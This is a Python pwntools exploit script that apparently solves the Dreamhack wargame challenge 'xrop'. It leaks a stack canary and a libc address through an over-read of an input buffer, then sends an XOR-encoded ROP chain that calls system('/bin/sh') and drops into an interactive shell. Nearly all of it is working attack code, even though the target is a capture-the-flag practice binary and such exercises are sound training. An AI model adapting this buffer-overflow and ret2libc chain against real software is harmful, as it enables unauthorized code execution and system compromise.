from pwn import *
import string

env = {"LD_PRELOAD": "/home/hibrian827/Wargame/Dreamhack/Pwnable/xrop/problem/deploy/libc.so.6"}
rem = process("./Pwnable/xrop/problem/deploy/prob", env=env)
# port = 21438
# rem = remote("host3.dreamhack.games", port)

lib = ELF("./Pwnable/xrop/problem/deploy/libc.so.6")

def send_payload(size):
  payload = b""
  letters = string.ascii_letters
  for i in range(size):
    payload += letters[i % len(letters)].encode()
  rem.sendafter(b"Input: ", payload)
  rem.recvuntil(b"You entered: ")
  rem.recvn(len(payload))


send_payload(0x19)
canary = u64(b"\x00" + rem.recvn(7))

send_payload(0x28)
lib_base = u64(rem.recvn(6) + b"\x00" * 2) - 128 + 0xb0 - lib.symbols['__libc_start_main']
sys_addr = lib_base + lib.symbols['system']
binsh_addr = lib_base + next(lib.search("/bin/sh"))
rdi_addr = lib_base + 0x2a3e5

print(hex(lib_base))

gdb.attach(rem)
payload = b"exit"
payload += b"\x00" * (0x18 - len(payload))
payload += p64(canary)
payload += p64(lib_base + 0x265000)
payload += p64(rdi_addr)
payload += p64(binsh_addr)
payload += p64(sys_addr)
sending = bytes([payload[len(payload) - 1]])
for i in range(len(payload) - 2, -1, -1):
  sending = bytes([payload[i] ^ sending[0]]) + sending
rem.sendafter(b"Input: ", sending)
print(rem.recvline())
rem.interactive()